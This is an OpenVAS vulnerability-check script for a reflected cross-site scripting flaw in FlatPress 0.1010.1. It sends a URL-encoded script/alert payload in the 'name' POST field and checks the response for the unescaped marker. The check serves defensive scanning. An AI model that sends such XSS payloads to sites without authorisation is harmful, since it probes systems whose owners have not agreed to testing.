##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_flatpress_xss_vuln.nasl 9721 2018-05-04 06:43:25Z ckuersteiner $
#
# FlatPress Cross-Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:flatpress:flatpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801947");
  script_version("$Revision: 9721 $");
  script_tag(name:"last_modification", value:"$Date: 2018-05-04 08:43:25 +0200 (Fri, 04 May 2018) $");
  script_tag(name:"creation_date", value:"2011-07-13 17:31:13 +0200 (Wed, 13 Jul 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("FlatPress Cross-Site Scripting Vulnerability");

  script_xref(name: "URL", value: "http://packetstormsecurity.org/files/view/102807/flatpress010101-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("flatpress_detect.nasl");
  script_mandatory_keys("flatpress/installed");

  script_tag(name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected website.");

  script_tag(name: "affected", value: "FlatPress version 0.1010.1 and prior");

  script_tag(name: "insight", value: "The flaw is due to input passed to 'name', 'email' and 'url' POST parameters
in index.php are not properly sanitised before returning to the user.");

  script_tag(name: "solution", value: "Upgrade FlatPress 0.1010.2 or later, For updates refer to
http://flatpress.org/home/");

  script_tag(name: "summary", value: "This host is running FlatPress and is prone to cross site scripting
vulnerability.");

  script_tag(name: "solution_type", value: "VendorFix");
  script_tag(name: "qod_type", value: "remote_analysis");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

host = http_host_name(port: port);

filename = dir + "/index.php?x=entry:entry110603-123922;comments:1";
authVariables = "name=%22%3E%3Cscript%3Ealert%28%22OpenVAS-XSS-TEST%22%" +
                "29%3B%3C%2Fscript%3E";

sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                "Host: ", host ,"\r\n\r\n",
                "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n\r\n",
                "Content-Length: ", strlen(authVariables), "\r\n",
                authVariables);
rcvRes = http_keepalive_send_recv(port: port, data: sndReq);

if (rcvRes =~ "HTTP/1\.. 200" && '><script>alert("OpenVAS-XSS-TEST");</script>' >< rcvRes) {
  security_message(port: port);
  exit(0);
}

exit(99);
